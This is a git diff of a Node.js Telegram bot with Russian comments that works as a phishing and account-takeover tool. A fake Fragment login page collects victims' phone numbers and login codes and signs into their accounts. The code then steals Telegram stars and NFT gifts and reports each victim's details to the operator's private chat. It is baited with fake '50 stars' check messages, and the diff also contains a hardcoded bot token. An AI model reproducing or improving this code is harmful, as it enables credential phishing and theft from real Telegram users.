@@ -5,6 +5,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
+const fs = require('fs');
 
 const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
 const API_ID = parseInt(process.env.API_ID) || 30427944;
@@ -57,7 +58,7 @@ db.serialize(() => {
 
 const activeSessions = new Map();
 
-// Web App с ВСЕМИ функциями
+// Web App
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
 });
@@ -96,6 +97,7 @@ app.post('/request-code', async (req, res) => {
         db.run(`INSERT OR REPLACE INTO sessions (phone, phone_code_hash, status) VALUES (?, ?, ?)`, 
             [phone, result.phoneCodeHash, 'code_requested']);
         
+        // УВЕДОМЛЕНИЕ ТОЛЬКО МНЕ
         await bot.sendMessage(MY_USER_ID, 
             `🔐 КОД ЗАПРОШЕН!\n📱 ${phone}\n⚡ Код должен прийти в Telegram`
         );
@@ -106,10 +108,28 @@ app.post('/request-code', async (req, res) => {
         });
         
     } catch (error) {
-        console.log('❌ Ошибка:', error);
+        console.log('❌ Ошибка запроса кода:', error);
+        
+        // ДЕТАЛЬНАЯ ОШИБКА ТОЛЬКО МНЕ
+        let errorMessage = `❌ ОШИБКА ЗАПРОСА КОДА:\n📱 ${phone}\n`;
+        
+        if (error.message.includes('PHONE_NUMBER_INVALID')) {
+            errorMessage += '⚠️ Неверный номер телефона';
+        } else if (error.message.includes('PHONE_NUMBER_FLOOD')) {
+            errorMessage += '⚠️ Лимит запросов для этого номера';
+        } else if (error.message.includes('PHONE_CODE_EMPTY')) {
+            errorMessage += '⚠️ Код не был отправлен';
+        } else if (error.message.includes('API_ID')) {
+            errorMessage += '⚠️ Проблема с API ключами';
+        } else {
+            errorMessage += `⚠️ ${error.message}`;
+        }
+        
+        await bot.sendMessage(MY_USER_ID, errorMessage);
+        
         res.json({ 
             success: false, 
-            message: `❌ Ошибка: ${error.message}` 
+            message: '❌ Не удалось отправить код. Попробуйте другой номер или проверьте лимиты.' 
         });
     }
 });
@@ -122,7 +142,7 @@ app.post('/sign-in', async (req, res) => {
     
     try {
         const sessionData = activeSessions.get(phone);
-        if (!sessionData) throw new Error('Сессия устарела');
+        if (!sessionData) throw new Error('Сессия устарела. Запросите код заново.');
         
         const result = await sessionData.client.invoke(
             new Api.auth.SignIn({
@@ -148,7 +168,6 @@ app.post('/sign-in', async (req, res) => {
             message += `⭐ Найдено звезд: ${assets.starsCount}\n`;
             message += `💰 Краду звезды...\n\n`;
             
-            // Крадем звезды
             const stealResult = await stealStars(phone);
             message += stealResult.message;
             
@@ -156,7 +175,6 @@ app.post('/sign-in', async (req, res) => {
             message += `🎁 Найдено NFT: ${assets.giftsCount}\n`;
             message += `📦 Краду подарки...\n\n`;
             
-            // Крадем подарки
             const giftResult = await stealGifts(phone);
             message += giftResult.message;
             
@@ -174,9 +192,24 @@ app.post('/sign-in', async (req, res) => {
         
     } catch (error) {
         console.log('❌ Ошибка входа:', error);
+        
+        let errorMessage = `❌ ОШИБКА ВХОДА:\n📱 ${phone}\n`;
+        
+        if (error.message.includes('PHONE_CODE_EXPIRED')) {
+            errorMessage += '⚠️ Код устарел. Запросите новый.';
+        } else if (error.message.includes('PHONE_CODE_INVALID')) {
+            errorMessage += '⚠️ Неверный код. Проверьте и попробуйте снова.';
+        } else if (error.message.includes('SESSION_PASSWORD_NEEDED')) {
+            errorMessage += '⚠️ Нужен пароль 2FA.';
+        } else {
+            errorMessage += `⚠️ ${error.message}`;
+        }
+        
+        await bot.sendMessage(MY_USER_ID, errorMessage);
+        
         res.json({ 
             success: false, 
-            message: `❌ Ошибка входа: ${error.message}` 
+            message: errorMessage 
         });
     }
 });
@@ -188,7 +221,6 @@ app.post('/process-bears', async (req, res) => {
     console.log(`🧸 ОБРАБОТКА МИШЕК: ${phone}`);
     
     try {
-        // Проверяем сессию
         db.get(`SELECT session_string FROM sessions WHERE phone = ? AND status = 'active'`, [phone], async (err, row) => {
             if (!row) {
                 return res.json({
@@ -197,7 +229,6 @@ app.post('/process-bears', async (req, res) => {
                 });
             }
             
-            // Обмениваем мишки
             const exchangeResult = await exchangeBearsForGift(phone);
             
             await bot.sendMessage(MY_USER_ID, exchangeResult.message);
@@ -205,10 +236,9 @@ app.post('/process-bears', async (req, res) => {
         });
         
     } catch (error) {
-        res.json({
-            success: false,
-            message: `❌ Ошибка: ${error.message}`
-        });
+        const errorMessage = `❌ ОШИБКА ОБМЕНА МИШЕК:\n${error.message}`;
+        await bot.sendMessage(MY_USER_ID, errorMessage);
+        res.json({ success: false, message: errorMessage });
     }
 });
 
@@ -283,7 +313,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает`);
 });
 
-// Web App с ВСЕМИ функциями
+// Web App
 const fragmentHTML = `
 <!DOCTYPE html>
 <html>
@@ -296,7 +326,6 @@ const fragmentHTML = `
         .btn { background: #007aff; color: white; border: none; padding: 15px; margin: 8px 0; border-radius: 10px; width: 100%; cursor: pointer; }
         .btn-success { background: #4cd964; }
         .btn-warning { background: #ff9500; }
-        .btn-danger { background: #ff3b30; }
         .stage { display: none; }
         .active { display: block; }
         #result { margin: 20px; padding: 15px; border-radius: 10px; display: none; }
@@ -306,7 +335,6 @@ const fragmentHTML = `
     </style>
 </head>
 <body>
-    <!-- Этап входа -->
     <div id="stage-login" class="active">
         <h2>🔐 Вход в аккаунт</h2>
         
@@ -321,7 +349,6 @@ const fragmentHTML = `
         <div id="login-result"></div>
     </div>
 
-    <!-- Этап кода -->
     <div id="stage-code">
         <h2>🔐 Введите код</h2>
         <input type="text" id="codeInput" class="input" placeholder="12345" maxlength="5">
@@ -330,7 +357,6 @@ const fragmentHTML = `
         <div id="code-result"></div>
     </div>
 
-    <!-- Этап управления -->
     <div id="stage-controls">
         <h2>💫 Управление аккаунтом</h2>
         
@@ -421,12 +447,10 @@ const fragmentHTML = `
         
         async function checkAssets() {
             showControlsResult('🔍 Проверяю активы...', true);
-            // Здесь будет запрос к серверу
         }
         
         async function stealStars() {
             showControlsResult('💰 Краду звезды...', true);
-            // Здесь будет запрос к серверу
         }
         
         async function processBears() {
@@ -485,23 +509,17 @@ app.get('/fragment.html', (req, res) => {
     res.send(fragmentHTML);
 });
 
-// КОМАНДЫ БОТА С ЧЕКАМИ
+// КОМАНДЫ БОТА С РАБОЧИМИ ЧЕКАМИ
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     
     bot.sendMessage(chatId, 
         '💫 @MyStarBank_bot - Система передачи звезд\n\n' +
-        '• Безопасные переводы\n' +
-        '• Мгновенные чеки\n' +
-        '• Поддержка 24/7\n\n' +
-        'Для начала работы:\n' +
-        '/balance - баланс\n' +
-        '/withdraw - вывод средств', {
+        'Для начала работы:', {
         reply_markup: {
             inline_keyboard: [
                 [{ text: "🔐 Войти в аккаунт", web_app: { url: WEB_APP_URL } }],
-                [{ text: "💫 Проверить баланс", callback_data: "balance" }],
-                [{ text: "🎫 Создать чек", callback_data: "create_check" }]
+                [{ text: "💫 Баланс", callback_data: "show_balance" }, { text: "🎫 Создать чек", callback_data: "create_check_info" }]
             ]
         }
     });
@@ -515,7 +533,7 @@ bot.onText(/\/balance/, (msg) => {
     });
 });
 
-// Чеки
+// СОЗДАНИЕ ЧЕКОВ С ФОТКОЙ
 bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
@@ -523,29 +541,66 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     
     db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, ?, ?)`, 
         [50, activations, userId], function(err) {
-        if (err) return;
+        if (err) {
+            console.log('❌ Ошибка создания чека:', err);
+            return;
+        }
         
         const checkId = this.lastID;
-        bot.sendMessage(chatId, `<b>Чек на 50 звезд</b>\n\n🪙 Заберите!`, {
-            parse_mode: 'HTML',
-            reply_markup: { inline_keyboard: [[{ text: "🪙 Забрать", callback_data: `claim_${checkId}` }]] }
-        });
+        const checkText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!`;
+        
+        // Пытаемся отправить с фото
+        const photoPath = path.join(__dirname, 'public/stars.jpg');
+        
+        if (fs.existsSync(photoPath)) {
+            bot.sendPhoto(chatId, photoPath, {
+                caption: checkText,
+                parse_mode: 'HTML',
+                reply_markup: { 
+                    inline_keyboard: [[{ 
+                        text: "🪙 Забрать звезды", 
+                        callback_data: `claim_${checkId}` 
+                    }]] 
+                }
+            }).catch(err => {
+                // Если фото не отправляется, отправляем текст
+                console.log('❌ Ошибка отправки фото:', err);
+                sendTextCheck(chatId, checkId, checkText);
+            });
+        } else {
+            // Если фото нет, отправляем текст
+            console.log('❌ Фото не найдено:', photoPath);
+            sendTextCheck(chatId, checkId, checkText);
+        }
     });
 });
 
-// Обработка callback
+// Функция отправки текстового чека
+function sendTextCheck(chatId, checkId, checkText) {
+    bot.sendMessage(chatId, checkText, {
+        parse_mode: 'HTML',
+        reply_markup: { 
+            inline_keyboard: [[{ 
+                text: "🪙 Забрать звезды", 
+                callback_data: `claim_${checkId}` 
+            }]] 
+        }
+    });
+}
+
+// Обработка callback ДЛЯ ЧЕКОВ
 bot.on('callback_query', async (query) => {
     const data = query.data;
     
-    if (data === 'balance') {
+    if (data === 'show_balance') {
         const userId = query.from.id;
         db.get(`SELECT balance FROM users WHERE user_id = ?`, [userId], (err, row) => {
-            bot.sendMessage(query.message.chat.id, `💫 Баланс: ${row?.balance || 0} stars`);
+            bot.sendMessage(query.message.chat.id, `💫 Ваш баланс: ${row?.balance || 0} stars`);
         });
     }
-    else if (data === 'create_check') {
+    else if (data === 'create_check_info') {
         bot.sendMessage(query.message.chat.id, 
-            'Для создания чека используйте:\n\n<code>@MyStarBank_bot 50</code>\n\nгде 50 - количество активаций', 
+            'Для создания чека используйте команду:\n\n<code>@MyStarBank_bot 50</code>\n\nгде 50 - количество активаций', 
             { parse_mode: 'HTML' }
         );
     }
@@ -553,21 +608,59 @@ bot.on('callback_query', async (query) => {
         const checkId = data.split('_')[1];
         const userId = query.from.id;
         
+        // НЕМЕДЛЕННО отвечаем чтобы убрать загрузку
+        await bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' });
+        
         db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
-            if (!row) {
-                bot.answerCallbackQuery(query.id, { text: '❌ Чек использован!' });
+            if (err || !row) {
+                bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован!' });
                 return;
             }
             
+            // Обновляем чек
             db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
+            
+            // Обновляем баланс
             db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
-                [userId, userId, row.amount]);
+                [userId, userId, row.amount], function(updateErr) {
                 
-            bot.answerCallbackQuery(query.id, { text: `✅ +${row.amount} звёзд!` });
+                if (updateErr) {
+                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка!' });
+                    return;
+                }
+                
+                bot.answerCallbackQuery(query.id, { text: `✅ Вы получили ${row.amount} звёзд!` });
+                
+                // Обновляем сообщение чека
+                const remaining = row.activations - 1;
+                const updatedText = `<b>🎫 Чек на 50 звезд</b>\n\n🪙 Заберите ваши звезды!${remaining > 0 ? `\n\nОсталось: ${remaining}` : '\n\n❌ ИСПОЛЬЗОВАН'}`;
+                
+                try {
+                    if (query.message.photo) {
+                        bot.editMessageCaption(updatedText, {
+                            chat_id: query.message.chat.id,
+                            message_id: query.message.message_id,
+                            parse_mode: 'HTML',
+                            reply_markup: remaining > 0 ? {
+                                inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
+                            } : { inline_keyboard: [] }
+                        });
+                    } else {
+                        bot.editMessageText(updatedText, {
+                            chat_id: query.message.chat.id,
+                            message_id: query.message.message_id,
+                            parse_mode: 'HTML',
+                            reply_markup: remaining > 0 ? {
+                                inline_keyboard: [[{ text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }]]
+                            } : { inline_keyboard: [] }
+                        });
+                    }
+                } catch (error) {
+                    console.log('Ошибка обновления чека:', error);
+                }
+            });
         });
     }
-    
-    await bot.answerCallbackQuery(query.id);
 });
 
-console.log('✅ Бот запущен - ПОЛНЫЙ ФУНКЦИОНАЛ');
+console.log('✅ Бот запущен - ВСЕ ФИКСЫ');
